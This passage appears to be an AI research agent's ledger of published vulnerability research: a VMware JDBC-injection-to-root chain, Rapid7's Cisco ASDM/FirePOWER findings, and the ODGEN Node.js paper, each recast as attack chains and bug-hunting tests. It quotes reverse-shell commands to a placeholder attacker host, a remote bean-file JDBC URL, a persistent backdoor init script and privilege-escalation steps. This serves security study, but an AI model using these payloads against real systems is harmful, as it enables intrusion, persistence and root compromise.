  2. JDBC INJECTION: `DBConnectionCheckController.dbCheck` takes attacker-controlled request params `jdbcUrl`, `dbUsername`, `dbPassword` → `DbConnectionCheckServiceImpl.checkConnection` → `FactoryHelper.getConnection` → `DriverManager.getConnection(jdbcUrl, username, password)` ("the attacker can reach a DriverManager.getConnection sink which will lead to an arbitrary JDBC URI connection. Given the flexibility of JDBC, the attacker can use any of the deployed drivers"). The admin gate only runs `if (this.organizationService.countOrganizations() > 0L)` and its exception is SWALLOWED (`log.info("Check for existing organization threw an exception...")`), so first-run/partial-setup states expose the sink unauthenticated.
  3. RCE — THREE DRIVER ROUTES, ALL INSIDE THE URL STRING: (a) MySQL driver `autoDeserialize=true` — "The server would connect back to the attacker's malicious MySQL server where it could deliver an arbitrary serialized Java object that could be deserialized on the server" (ysoserial `CommonsBeanutils1`); (b) PostgreSQL `jdbc:postgresql://si/saas?&socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://attacker.tld:9090/bean.xml` — "an attacker can trigger the execution of a constructor defined in an arbitrary Java class with a controlled string argument"; (c) NO-OUTBOUND variant: `socketFactory=com.vmware.licensecheck.LicenseChecker&socketFactoryArg=<payload>` — the vendored `LicenseChecker(String)` constructor → `LicenseHandle.setState` → Base64-decode → `Encrypt.decrypt` with a HARDCODED key (`keyBytes_v2`) → `ObjectInputStream.readObject()` on attacker bytes; the generator PoC reuses VMware's own classes to wrap a `CommonsBeanutils1` payload in `_htEvalStart` and double-URL-encodes `lc.getState()` into the URL. "the first connection to a PostgreSQL database doesn't need to be established for the attack to succeed so an invalid host/port is perfectly fine."
  4. ROOT PRIVESC AFTER RCE AS `horizon`: two root-sudo scripts with logic flaws — `publishCaCert.hzn` (`cp -f $CERTFILE /etc/ssl/certs/$(basename $2)` then `chmod 644` — plant a file into the trust store dir) and `gatherConfig.hzn` (writes `${DEBUG_FILE}/debugConfig.txt` then `chown $TOMCAT_USER:$TOMCAT_GROUP $DEBUG_FILE` — point `debugConfig.txt` at a SYMLINK to chown a root-owned file to tomcat); combined: "overwriting the permissions of the certproxyService.sh script so that it can be modified by the horizon user" → root.
DETECTION SIGNAL: (a) bootstrap/installer-created default OAuth clients with predictable ids (`Service__*`, `system`, `default`) reachable from setup/activation/registration endpoints that mint client credentials without auth; (b) any endpoint passing a user-supplied `jdbcUrl`/`connection.url`/`dbUrl` to `DriverManager.getConnection` — "test connection"/"check DB" setup wizards, especially where the auth gate is conditional on a state count or its exception is swallowed; (c) verbose `SQLException`/driver stack traces answering URL probes = the sink is live.
CHAIN: unauthenticated `generateActivationToken` on the default `Service__OAuth2Client` id (primitive: predictable bootstrap client + cred-minting activation endpoint) → `activate` returns `client_id`/`client_secret` → standard OAuth2 exchange → signed JWT = complete authentication bypass (link 1) → `dbCheck` `jdbcUrl` reaches `DriverManager.getConnection` (link 2: JDBC injection) → `socketFactory=com.vmware.licensecheck.LicenseChecker&socketFactoryArg=<state>` → hardcoded-key decrypt → `ObjectInputStream.readObject` (link 3: deserialization, zero outbound connections) → CommonsBeanutils1 gadget → RCE as `horizon` (link 4) → sudo `publishCaCert`/`gatherConfig` symlink+chown games → root-owned `certproxyService.sh` made writable → root (impact: pre-auth 0-click remote root of the identity provider of the whole org).
TRANSFERABLE TEST: (1) on any self-hosted OAuth/OIDC/SSO product, enumerate default/bootstrap service clients (ids `Service__*`/`system`/`default`, from docs, installer code or leaked JS) and hit every activation/registration/credential-minting endpoint with that id — a returned `client_secret` is an instant auth bypass; (2) for any user-supplied JDBC/DB URL, prove the sink with one benign OOB probe (`jdbcUrl=jdbc:postgresql://x/x?socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://<collab>/b.xml` and a MySQL `autoDeserialize` probe to `<collab>:3306`), then attack ONLY the DEPLOYED drivers: socketFactory class-with-string-arg instantiation, MySQL `autoDeserialize` object delivery, in-URL serialized-state deserialization (LicenseChecker-style hardcoded-key blobs), JNDI `dataSourceName`; (3) after any code exec as a service user on an appliance: `sudo -l`, audit every root script for copy-to-sensitive-dir + chmod and chown-of-a-user-controlled-path (symlink it at a root-owned file), then check which root-executed scripts just became writable. Rule: **a "test DB connection" URL is an RCE primitive — JDBC drivers are plugin architectures whose URL parameters name classes to instantiate, factories to call with an attacker string, and deserializers to feed; and on appliances the road to root usually runs through a sudo script that chowns or chmods a path you control.**
DEDUPE/DELTA: 0 hits across all three write targets for `workspace one`, `hekate`, `Service__OAuth2Client`, `generateActivationToken`, `activationToken`, `dbCheck`, `socketFactory`, `autoDeserialize`, `FileSystemXmlApplicationContext`, `LicenseChecker`, `publishCaCert`, `gatherConfig`. Related-but-distinct REVIEWED and NOT re-recorded: the Kafka-Connect "connector config is code-execution surface" entries (#1547877 JDBC-driver FILE WRITE + Jolokia `jvmtiAgentLoad`; #1529790 `*.sasl.jaas.config` login-module — those are PROPERTY names in connector configs, not a JDBC URL reaching `DriverManager.getConnection`); the JSON-RPC c3p0 `HexAsciiSerializedMap` entry and §17.510 (deserialization on other substrates — raw Java serialization, .NET BinaryFormatter, JSON polymorphic typing); the recorded k8s-SA-token/IMDS chain endpoints. SOURCE: https://www.rapid7.com/blog/post/2022/08/11/rapid7-discovered-vulnerabilities-in-cisco-asa-asdm-and-firepower-services-software/  2026-11-11
ROUTE: the ASSIGNED URL now returns 404 (Rapid7 relocated the post off the dated slug); the live copy was located via web search at the dateless slug `https://www.rapid7.com/blog/post/rapid7-discovered-vulnerabilities-in-cisco-asa-asdm-and-firepower-services-software/` — `web_extract` there again cut mid-table, so the full 36,335-char article was read IN FULL via `browser_exec` (`document.body.innerText`). Author Jake Baines (Rapid7); disclosed 2022-08-11 at Black Hat USA / DEF CON 2022. Issues: CVE-2022-20829 (unsigned ASDM package), CVE-2021-1585 (ASDM launcher code execution via MITM/evil endpoint — "failed patch"), CVE-2022-20828 (authenticated FirePOWER command injection), CVE-2022-20651 (ASDM logs credentials), CSCvo79327 / CSCvu90861 (FirePOWER boot image), CSCwc21296 (unsigned Windows installer).
STATUS: UNVERIFIED (not reproduced — no ASA/ASDM was exercised; all request shapes and quotes are Rapid7's own text)
CLASS: RCE / command execution on the network-appliance MANAGEMENT PLANE — (1) client-side RCE + supply chain via an UNSIGNED distributable admin-client package (header hash but no signature, CWE-347), (2) MITM/evil-endpoint code execution + credential theft in the admin client (no TLS certificate validation + HTTP Basic by default), (3) authenticated OS command injection via a CLI-passthrough verb reaching the sidecar FirePOWER Linux VM as root, (4) update-package FORMAT DOWNGRADE backdoor persisting across reboots/upgrades.
CORE METHOD (the article's own):
  1. UNSIGNED ADMIN PACKAGE → CLIENT RCE (CVE-2022-20829): the ASDM launcher on connect "will download a large number of Java files from the ASA, load them into memory, and then pass execution to the downloaded Java"; the ASDM binary package "lacked any type of cryptographic signature to verify the package's authenticity (see CWE-347)" — "We discovered that we could modify the contents of an ASDM package, update a hash in the package's header, and successfully install the package on a Cisco ASA." Result: a crafted package (malicious installers/web pages/Java) gives the attacker code execution on EVERY admin system that connects (Rapid7's tool `the way` extracts/rebuilds packages and can embed a reverse shell; "A similar attack was executed by Slingshot APT against Mikrotik routers and the administrative tool Winbox").
  2. EVIL ENDPOINT / MITM (CVE-2021-1585): "The vulnerability allows a man-in-the-middle or evil endpoint to execute arbitrary Java code on an ASDM administrator's system via the ASDM launcher" — and the client "does not verify the server's SSL certificate" and "uses HTTP Basic Authentication by default (leading to password disclosure to active MITM)". THE FIX-VERIFICATION METHOD: Cisco claimed ASDM 7.18.1.150 fixed it; Rapid7 re-ran the public exploit (`staystaystay`) "without any code changes" (only `version.prop` bumped and `/public/jploader.jar` mirrored onto the exploit web server) — the claimed fix was not a fix.
  3. CLI-PASSTHROUGH COMMAND INJECTION → ROOT ON THE MODULE (CVE-2022-20828): the ASA CLI `session do` command — also reachable over ASDM HTTP — executes a Linux command inside the FirePOWER module VM ("a Linux-based virtual machine (VM) hosted on the ASA... fully networked and can access both outside and inside of the ASA"). Tweetable PoC: `curl -k -u albinolobster:labpass1 -H "User-Agent: ASDM/ Java/1.8" "https://<asa>/admin/exec/session+sfr+do+\`bash%20-i%20>&%20%2fdev%2ftcp%2f<attacker>%2f1270%200>&1\`"` — a backtick-wrapped command inside the CLI verb = root reverse shell.
  4. BOOT-IMAGE SHELL + FORMAT DOWNGRADE (CSCvu90861 etc.): the FirePOWER boot image CLI has documented credentials but "what isn't documented is that the credentials root:cisco123 will drop you down into a root bash shell", plus a `system install` command injection; and the boot image accepts BOTH `EncryptedContentSignedChksumPkgWrapper` ("Cisco only appears to publish FirePOWER installation packages in that format") AND the insecure `ChecksumPkgWrapper` — Rapid7's `whatsup` tool unpacks the secure package, inserts a backdoored init script (`while true; do sleep 300; /bin/bash -i >& /dev/tcp/<attacker>/1270 0>&1; done`), and repackages as checksum-only: "The contents of the installation package survive reboots and upgrades. An attacker need only pre-install the FirePOWER module with a malicious version before providing it to the victim."
  5. THE AUTH-WEAKNESS MULTIPLIER: ASDM documents `<blank>:<blank>` default credentials, "by default, doesn't have brute-force protections enabled", and logs credentials to a local file (CVE-2022-20651) — so the credentialed injection in (3) is one MITM or brute force away from root.
DETECTION SIGNAL: internet-facing appliance management planes (Rapid7's June 2022 scan: <0.5% of internet-facing ASDM had the newest version, most common 7.8.2 from 2017); downloadable admin-client/update packages whose only integrity check is a header hash/checksum; admin clients that fetch and EXECUTE code (Java/jnlp) from the device without TLS validation; management endpoints passing CLI verbs to a sidecar VM (`/admin/exec/<cli>` with `session <module> do ...`); installers accepting more than one package-wrapper format.
CHAIN: malicious ASDM package installed on the ASA (supply chain / insider / "free download" — Cisco downloads require a valid contract) OR MITM of an admin client with no TLS validation (Basic-auth credential theft is free) → every admin that connects downloads and executes attacker Java → admin-workstation RCE (link 1) → MITM-stolen / default / brute-forced credentials (no lockout) → ASDM HTTPS `/admin/exec/session+sfr+do+\`cmd\`` → root command execution inside the dual-homed FirePOWER VM (link 2: inside+outside network position, running Snort on the traffic = pivot + hideout) → enterprise compromise; parallel persistence: boot image `root:cisco123` / `system install` injection, and the ChecksumPkgWrapper downgrade backdoor surviving reboot/upgrade.
TRANSFERABLE TEST: on every appliance/vendor with a downloadable admin client or update package: (1) extract the package, add a marker file, update whatever header hash/checksum it carries, reinstall — acceptance = integrity-without-authenticity (CWE-347) and every admin-side code execution follows; (2) in a lab, MITM the admin client — no server-cert validation + Basic auth = credential theft chaining straight into (3); (3) fuzz management CLI-passthrough endpoints (`/admin/exec/...`, `session <x> do <cmd>`) with backticks/`$(id)`/pipes wrapped around the verb arguments; (4) repack the newest signed update into any LEGACY wrapper format the installer still accepts with a benign marker init script (lab only) — accepted = downgrade persistence; (5) when a vendor says "fixed in X", re-run the ORIGINAL exploit against the claimed-fixed build first (`staystaystay` worked unchanged against the "fix"). Rule: **an appliance's management plane is a full attack surface: a hash is not a signature, a claimed fix is not a fix until the old exploit fails, and a CLI verb that reaches a sidecar VM is root command injection.**
DEDUPE/DELTA: 0 hits across all three write targets for `ASDM`, `FirePOWER`, `20828`, `20829`, `CVE-2021-1585`, `staystaystay`, `ChecksumPkgWrapper`, `session sfr`, `Mikrotik`, `Winbox`, and `unsigned` as a package-signing concept. Related-but-distinct REVIEWED and NOT re-recorded: the generic web upload/extension matrices (wrong domain — this is vendor package SIGNING, not web upload), the recorded "fix bypass loop" bounty practice (process, not technique), and the command-injection differential templates (the carrier `session sfr do \`cmd\`` is a CLI-passthrough verb and per the established ruling a carrier alone is not an entry). NEW: the appliance management-plane chain — integrity-hash-only distributable admin packages → admin-client RCE on connect; claimed-fix re-verification discipline; update-package format downgrade for persistence. Ledger entry only (no §17 slot: each link is a known CWE; the value is the chain shape on appliance management planes, adjacent to but distinct from the web surface). FRESHNESS: disclosed to Cisco 2022-02/2022-03, published 2022-08-11 — outside the preferred 6-12 month window (read because assigned).

SOURCE: https://www.usenix.org/conference/usenixsecurity22/presentation/li-song  2026-11-11 — "Mining Node.js Vulnerabilities via Object Dependence Graph and Query", Song Li, Mingqing Kang, Jianwei Hou, Yinzhi Cao (Johns Hopkins), 31st USENIX Security Symposium (2022), pp. 143-160.
ROUTE: the presentation page via `web_extract` (bib + media links only); the linked prepublication PDF `sec22summer_li-song.pdf` 404s on usenix.org AND via r.jina.ai; the full 92,636-char paper text was then obtained from the Wayback copy `https://web.archive.org/web/2023id_/https://www.usenix.org/system/files/sec22summer_li-song.pdf` (curl + pdfminer, complete PDF with %%EOF) and read IN FULL this pass (motivating example, ODG queries, Tables 2-4); the linked artifact appendix `usenixsecurity22-li-song.pdf` was also read live from usenix.org. Tool: ODGEN, https://github.com/Song-Li/ODGen (docker `iamthesong/odgen:latest`).
STATUS: UNVERIFIED (not reproduced — ODGEN was not run against anything; the patterns and quotes below are the paper's own text)
CLASS: code/command injection, code execution, SQLi, XSS, path traversal / arbitrary file write, prototype pollution and INTERNAL PROPERTY TAMPERING in Node.js — a static-analysis QUERY method (Object Dependence Graph) whose value for hunting is the six concrete BUG SHAPES it formalizes (180 zero-day vulnerabilities reported, 70 CVEs assigned at publication).
CORE METHOD (the paper's own):
  1. THE KEY PRIMITIVE — attacker-controlled PROPERTY NAME. Motivating example: `myFunc[source2] = myFunc.x + source1; sink(myFunc.x);` with both sources attacker-controlled. ONE line, TWO bugs depending on the key: key = `__proto__` → INTERNAL PROPERTY TAMPERING ("the prototype chain of myFunc is overwritten... the internal property x of myFunc is tampered... may lead to a consequence like Denial of Service... or privilege escalation (e.g., if myFunc.x is used later as part of an authentication)"); key = `x` → the attacker plants an OWN property `x` SHADOWING `Func.prototype.x`, so the later read `myFunc.x` resolves to attacker data into `sink` (e.g. `exec` → command injection). ODGEN models `obj[attackerKey]` as a WILDCARD object with property `*` — an attacker-keyed write potentially touches EVERY property of the object.
  2. IPT QUERY (shape to hunt manually): find `obj[prop] = value` where (i) `prop` is adversary-controllable, (ii) `value` is adversary-controllable, (iii) `obj` has a prototypical object that HAS the property, and (iv) that property is read LATER in control flow (control-dependent on the assignment) with more than one possible lookup — the write tampers/shadows what the read resolves to.
  3. TAINT-SHAPE QUERY: `sink(arg)` where `arg`'s OBJECT-LEVEL data dependency reaches a source through a keyed write — the wildcard lookup `obj[key]=val` feeds ANY later `obj.<name>` read. Instantiated sinks: `child_process.exec` (command injection), `eval` (code execution), `connection.query` (SQLi), `response.write` (reflected XSS), stored-XSS via `connection.query ◦ UNSANITIZED ◦ ARG1 ◦ response.write`, and file sinks — path traversal modeled as `http CreateServer` → request callback → `ReadFile` argument → response; arbitrary file write as callback → `fs.writeFile`.
  4. PROTOTYPE POLLUTION SHAPES: via `__proto__` (two chained adversary-controlled assignments) and via `constructor.prototype` (THREE chained adversary-controlled assignments) reaching a built-in — distinct from IPT: pollution alters built-ins through the chain, IPT/shadowing alters ONE object's property resolution.
  5. TOOL: ODGEN (open source, GPL) builds the ODG by flow- and context-sensitive abstract interpretation with hybrid branch-sensitivity/points-to, then runs these graph queries; the artifact ships datasets: 174 zero-day packages (80 command injection, 24 IPT, 30 path traversal, 19 proto pollution, 13 XSS, 14 code exec) and a 256-package legacy benchmark.
DETECTION SIGNAL: in any Node.js code you are allowed to read (target server code, custom npm packages, vendored bundles, serverless handlers, plugin/report/formula JS): a write with a NON-LITERAL property name (`obj[req.body.key] = ...`, `obj[lookup] = ...`) or a deep-merge/extend fed request data, on an object whose properties are later read into AUTH decisions (`if (user.isAdmin)`), control flow, or sinks (`exec`/`eval`/`query`/`write`/`readFile`/`writeFile`); plus the two PP chains (`__proto__`/`constructor.prototype` in merges) and `eval`/`Function`/`child_process` sinks fed from object reads.
CHAIN: attacker controls a property NAME in a keyed write (primitive: wildcard write — `obj[key]=value` can set any property) → (a) IPT branch: the write tampers/shadows the prototype-derived property later read in an AUTH or control position → privilege escalation or DoS; (b) taint branch: the shadowed property carries attacker VALUE into `child_process.exec`/`eval`/`connection.query`/`response.write`/`fs.writeFile` → command execution, code execution, SQLi, XSS, arbitrary file write; (c) PP branch: chained assignments through `__proto__`/`constructor.prototype` alter built-ins → gadget (e.g. the recorded Kibana `sourceURL` chain → RCE). The paper's demonstrated impact set: 180 zero-days / 70 CVEs across exactly these chains.
TRANSFERABLE TEST: on every Node.js surface you may read: (1) grep for keyed writes with non-literal keys (`obj[`, `[key]`, `merge(`/`extend(`/`deepMerge(` fed request data) and treat each as a WILDCARD write — "this can set ANY property of this object"; (2) follow every later read of that object's properties into auth/role checks (IPT → privilege escalation) and into `child_process.exec|spawn`, `eval|Function`, `db.query`, `res.write`, `fs.readFile|writeFile` (shadowing → injection); (3) send the PP probes `{"a":{"__proto__":{"zzprobe":"1"}}}` and `{"a":{"constructor":{"prototype":{"zzprobe":"1"}}}}` through every object-merge API (recorded method) AND look for three-deep `constructor.prototype` chains a merge must follow; (4) on bulk third-party code (custom packages, plugins), run ODGEN itself (`./odgen.py -t os_command --list <pkgs> --nodejs`, docker `iamthesong/odgen:latest`) and audit what it flags. Rule: **an attacker-controlled property NAME is as dangerous as an attacker-controlled value: `obj[key]=value` is a write to every property at once (shadow a prototype property → inject into a sink; tamper it → auth bypass), and the audit question for every keyed write is "which later reads of this object resolve to my data?"**
DEDUPE/DELTA: 0 hits across all three write targets for `ODGEN`, `object dependence`, `internal property tampering`, `IPT`, `wildcard object`, `property tamper`/`property shadow`. Related-but-distinct REVIEWED and NOT re-recorded: the prototype-pollution family (§1.3 client-side PP→XSS; §17.104 Kibana server-side PP→codegen RCE; the "hunt the merge sink `__proto__`/`constructor.prototype`" lesson — the PP branch is recorded material, referenced not re-recorded), the Keycloak #2221104 entry (a REFLECTED property NAME in an error page = XSS carrier, not a keyed-write primitive), §17.510's `@class` type tag (object construction, not property shadowing). NEW → §17.513: the property-NAME-controlled wildcard write + INTERNAL PROPERTY TAMPERING/shadowing lens (`obj[attackerKey]=attackerVal` resolving through the wildcard to any property → auth tamper or sink flow), with the paper's Node.js sink/shape table. FRESHNESS: USENIX Security 22 (Aug 2022; CVE dataset 2019-2020) — outside the preferred 6-12 month window (read because assigned).
